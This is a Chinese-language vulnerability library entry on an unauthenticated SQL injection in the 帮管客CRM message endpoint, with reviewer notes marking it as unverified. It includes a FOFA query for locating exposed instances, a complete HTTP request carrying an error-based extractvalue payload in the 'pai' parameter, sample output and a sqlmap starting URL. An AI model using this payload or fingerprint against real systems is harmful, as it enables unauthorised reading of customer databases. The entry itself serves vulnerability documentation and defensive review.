---
source: "wy876 漏洞文库"
title: "帮管客CRM message pai SQL注入"
product: "帮管客CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL extractvalue报错环境，版本未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mqhzq6w8dmpgikxd"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRM/%E5%B8%AE%E7%AE%A1%E5%AE%A2CRMmessage%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"帮管客-CRM\""
id: "vw-309aac9bf4983895c2882780"
entity_id: "ve-309aac9bf4983895c2882780"
schema_version: "1"
---

# 帮管客CRM message pai SQL注入

## 条目说明

- 对象与具体问题：帮管客CRM；message pai SQL注入
- 版本、配置及部署条件：MySQL extractvalue报错环境，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 列出的MD5片段为截断值，应注明XPath错误长度限制及实际返回上下文，非完整hash
- pai可能排序表达式位置，参数化值绑定不一定适用，需源码确认为白名单修复
- 只标记无HTTP错误响应，sqlmap小节基准URL不构成验证
- 补版本/修复并与其他message产品区分

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
帮管客CRM是一款集客户档案、销售记录、业务往来等功能于一体的客户管理系统。帮管客CRM客户管理系统，客户管理，从未如此简单，一个平台满足企业全方位的销售跟进、智能化服务管理、高效的沟通协同、图表化帮管客CRM 客户管理系统/index.php/message 接口存在 sql 注入漏洞，未经身份认证的攻击者可通过此漏洞获取数据库敏感信息。

## 二、影响版本
+ 帮管客CRM

## 三、资产测绘
+ fofa`app="帮管客-CRM"`
+ 特征


## 四、漏洞复现
```http
GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select+md5(1)),0x7e))%23&xu=desc HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```


```plain
c4ca4238a0b923820dcc509a6f75849
```

sqlmap

```plain
/index.php/message?page=1&pai=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mqhzq6w8dmpgikxd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
